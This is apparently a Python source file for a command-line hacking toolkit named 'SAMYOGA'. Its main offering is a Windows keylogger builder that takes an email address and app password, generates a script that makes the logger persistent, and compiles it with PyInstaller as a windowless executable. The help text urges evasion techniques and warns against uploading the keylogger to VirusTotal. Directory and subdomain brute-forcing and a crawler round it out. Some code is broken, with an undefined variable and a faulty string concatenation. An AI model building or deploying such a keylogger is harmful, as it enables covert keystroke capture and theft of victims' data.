#import argparse
import platform
import subprocess
import os
import sys
import re
from pyfiglet import figlet_format
from rich import print
from Hidden_directorys import DirectoryScanner
from searching_subdomains import SubdomainScanner
from logo import logo_for_ending
from Spider import SimpleCrawler
from Default_paths import DEFAULT_WORDLIST_DIR, DEFAULT_WORDLIST_SUB

#==========================PATH FOR PYINSTALLER IN LINUX==========================
Pyinstller_path = os.path.expanduser("/root/.wine/drive_c/Python32/Scripts/pyinstaller.exe")

#=====================Making Dictionary for command and tool===================
available_commands = {
    "[green]use": "Use a specific tool\n",
    "info": "Information on a specific tool\n",
    "exit": "Completely exit Tool\n"
}
available_tools = {
    " 1": "Simple Keylogger - A Simple Keylogger For Windows\n",
    "2": "Finding Hidden Directories - With Custom or Default Wordlists\n",
    "3": "Finding Subdomains - With Custom aor Default Wordlists\n",
    "4": "Simple Crawler \n" 
}

def main():
    try:
        if platform.system().startswith("Windows"):#CHECKING IS THE PROGRAM IS EXECUTED ON WINDOWS OR NOT
            subprocess.call("cls", shell=True)
        else:
            subprocess.call("clear", shell=True)
        print(figlet_format("**SAMYOGA**", font="standard"))#CLI KEYLOGGER ACSII ART
        # print(chalk.green("````Keylogger Program````"))
        print('[bold][blue]Available Commands :\n')
        strin_cmd = ' '
        strin_tool = ''
        for key in available_commands:
            strin_cmd += str(key) + ' : ' + available_commands[key] + ' '#CONVERTING DICTIONARY INTO NORMAL STRING
        print(strin_cmd)
        print("\n[bold][blue]Available Tools :\n")
        for key in available_tools:
            strin_tool += str(key) + ' : ' + available_tools[key] + ' '#CONVERTING DICTIONARY INTO NORMAL STRING
        print(strin_tool)

        while True:
            main_menu_cmd = input("Samyog - >").strip()
            if len(main_menu_cmd.split()) == 1 and main_menu_cmd != "use":
            	print("[purple][+]For using a tool use the Available Command. [blue]Example :- use <number>")
            # Implementing the use command
            if main_menu_cmd.startswith("use"):
                if len(main_menu_cmd.split()) == 1 and main_menu_cmd == "use":
                    print("\n[bold][purple]Select any one Tool with 'use' Keyword.\n")
                elif len(main_menu_cmd.split()) == 2:
                    tool_choice = main_menu_cmd.split()[1]#EXTRACTING THE INT USED AFTER USE COMMAND

                    if tool_choice == '1':
                        print("\n[green][+]Provide the details for your keylogger file::--\n")
                        making_keylogger()
                    
                    if tool_choice == '2':
                        print("\n[green][+]Hidden Directory Finder.\n")
                        finding_directory()

                    if tool_choice == '3':
                        print("\n[green][+]Hidden Sub-Domain Finder.\n")
                        finding_subs()
                    if tool_choice == '4':
                        print("\n[green][+]Crawler or Spider.\n")
                        start_crawler()

            # Implementing the Exit command
            elif main_menu_cmd.startswith("exit"):
                if platform.system().startswith("Windows"):#Checking the file is executed on windows
                    os.system("cls")
                    logo_ = logo_for_ending()
                    print(logo_)
                    print("[green]Warning :\n`````````````[***] Don't upload the Keylogger on Virustotal.com[***]`````````````")
                    input("[-]Click enter to exit....... ")
                    os.system("cls")
                    sys.exit()
                else:
                    os.system("clear")
                    logo_ = logo_for_ending()
                    print(logo_)
                    print(
                        "[green]Warning :\n\n`````````````[***] Don't upload the Keylogger on Virustotal.com[***]`````````````")
                    input("[-]Click enter to exit....... ")
                    os.system("clear")
                    sys.exit()

            #Implementing the info command
            elif main_menu_cmd.startswith('info'):
                if len(main_menu_cmd.split()) == 1 and main_menu_cmd == "info":
                    print("[green][*]Please Select a Tool Number Which you Want to know About. eg., info <Tool No.>")
                elif len(main_menu_cmd.split()) == 2:
                    tool_choices = main_menu_cmd.split()[1]
                    if tool_choices == '1':
                        print('''[yellow][+]It Create a Simple Windows Keylogger.Requirement :- Active Email Address and Its App Password
                              To Know How To Generate App Password Visit :
                              https://itsupport.umd.edu/itsupport?id=kb_article_view&sysparm_article=KB0015112
                              
                              Do or Use Evasion Techniques to Make it More Undetectable ''')
                    if tool_choices == '2':
                        print('''[yellow][+]A Simple Directory Search Tool. Requirement :- A URL including http:// or https:// and can use a Custom Wordlist If you have it''')
                    if tool_choices == '3':
                        print('''[yellow][+]A Simple Sub-Domain Searching Tool. Requirement :- A URL without including http:// or https:// and can use a Custom Wordlist If you have it''')

    except KeyboardInterrupt:
        print("\n\n[bold][red][-]CTRL C is Pressed Quitting........!!!!")

#***8**************************8*********=================TAKING USER INPUT FOR KEYLOGGER FILE====================*****************8********

def is_valid_email(email):
    return re.match(r'^[^@]+@[^@]+\.[^@]+$', email)

def is_valid_filename(filename):
    return re.match(r'^[\w,\s-]+\.[A-Za-z]{1,5}$', filename)

def making_keylogger():
    while True:
        email = input("[+] Enter your email: ").strip()
        if is_valid_email(email):
            break
        print("[!] Invalid email format. Please try again.")

    while True:
        password = input("[+] Enter your password (App-specific password recommended): ").strip()
        if password:
            break
        print("[!] Password cannot be empty.")

    while True:
        time_interval = input("[+] Enter interval (in seconds) for sending emails: ").strip()
        if time_interval.isdigit() and int(time_interval) > 0:
            time_interval = int(time_interval)
            break
        print("[!] Please enter a valid positive number.")

    while True:
        file_name = input("[+] Enter name for the output file : ").strip()
        if is_valid_filename(file_name):
            break
        print("[!] Invalid file name. Use a valid format like 'logger'.")

    create_keylogger_executable(file_name, time_interval, email, password)
    if platform.system().startswith("Windows"):
        compile_for_windows_in_windows(file_name)
    else:
        compile_for_windows(file_name)

#======== Making Keylogger File============
def create_keylogger_executable(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("zlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("zlogger.become_persistent()\n")
        file.write("zlogger.start()\n")

#==================Compiling for Windows===============
def compile_for_windows(file_name):
    subprocess.call(["wine", Pyinstller_path, "--onefile", "--noconsole", file_name])

#==============Compiling for Windows if the program is executed on Windows=======
def compile_for_windows_in_windows(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])



#*8**************************=========================User Input For Directory Finding==================*******************8**8****#
def is_valid_url(url):
    return re.match(r'^https?://', url)

def is_valid_file(path):
    return os.path.isfile(path)

def is_valid_filename(filename):
    return re.match(r'^[\w,\s-]+\.[A-Za-z]{1,5}$', filename)

def finding_directory():
    while True:
        target_url = input("[+] Enter Target URL (with http:// or https://): ").strip()
        if is_valid_url(target_url):
            break
        print("[!] Invalid URL. Please include http:// or https://.")

    while True:
        user_input = input("[?] Do you want to use a custom wordlist? (y/n): ").strip().lower()
        if user_input in ('y', 'n'):
            break
        print("[!] Please enter 'y' or 'n'.")

    while True:
        file_result = input("[*] Output File Name (e.g., results.txt): ").strip()
        if is_valid_filename(file_result):
            break
        print("[!] Invalid file name. Use alphanumeric characters and end with a valid extension (e.g., .txt).")

    #DEFAULT_WORDLIST = "/home/kali/Key-Logger/directory-list-2.3-medium.txt"

    if user_input == 'n':
        if not is_valid_file(DEFAULT_WORDLIST):
            print(f"[!] Default wordlist not found at {DEFAULT_WORDLIST}.")
            return
        Scan = DirectoryScanner(target_url, DEFAULT_WORDLIST_DIR, file_result)
        Scan.scan()
    else:
        while True:
            wordlist_path = input("Enter the path to your custom wordlist: ").strip()
            if is_valid_file(wordlist_path):
                break
            print("[!] Wordlist file not found. Please check the path and try again.")
        Scan = DirectoryScanner(target_url, wordlist_path, file_result)
        Scan.scan()


#============================********8*******************8**USER INPUT FOR SUBDOMAIN FINDER8***********************============================

def is_valid(url):
    return re.match(r'^(?!https?://)[\w.-]+\.[a-zA-Z]{2,}$', url)

def is_valid_file(path):
    return os.path.isfile(path)

def is_valid_filename(filename):
    return re.match(r'^[\w,\s-]+\.[A-Za-z]{1,5}$', filename)

def finding_subs():
    while True:
        target_url = input("[+] Enter Target URL (without https://): ").strip()
        if is_valid(target_url):
            break
        print("[!] Invalid URL. Please don't include http:// or https://. e.g.,google.com")

    while True:
        user_input = input("[?] Do you want to use a custom wordlist? (y/n): ").strip().lower()
        if user_input in ('y', 'n'):
            break
        print("[!] Please enter 'y' or 'n'.")

    while True:
        file_result = input("[*] Output File Name (e.g., results.txt): ").strip()
        if is_valid_filename(file_result):
            break
        print("[!] Invalid file name. Use alphanumeric characters and end with a valid extension (e.g., .txt).")

    #DEFAULT_WORDLIST = "/home/kali/Key-Logger/subdomain_wordlist.txt"

    if user_input == 'n':
        if not is_valid_file(DEFAULT_WORDLIST):
            print(f"[!] Default wordlist not found at {DEFAULT_WORDLIST}.")
            return
        Scan = SubdomainScanner(target_url, DEFAULT_WORDLIST_SUB, file_result)
        Scan.scan()
    else:
        while True:
            wordlist_path = input("Enter the path to your custom wordlist: ").strip()
            if is_valid_file(wordlist_path):
                break
            print("[!] Wordlist file not found. Please check the path and try again.")
        Scan = SubdomainScanner(target_url, wordlist_path, file_result)
        Scan.scan()

#====================**************8**************88********CRAWLER*****************************========================
def start_crawler():
    while True:
        target_url = input("[+] Enter Target URL (with http:// or https://): ").strip()
        if is_valid_url(target_url):
            break
        print("[!] Invalid URL. Please include http:// or https://.")
    while True:
        file_result = input("[*] Output File Name (e.g., results.txt): ").strip()
        if is_valid_filename(file_result):
            break
        print("[!] Invalid file name. Use alphanumeric characters and end with a valid extension (e.g., .txt).")
    crawler = SimpleCrawler(target_url,file_result)
    crawler.crawl()
    print(f"[green][*]The Result will be stored in this File ----> {file_result}")
	

if __name__ == "__main__":
    main()
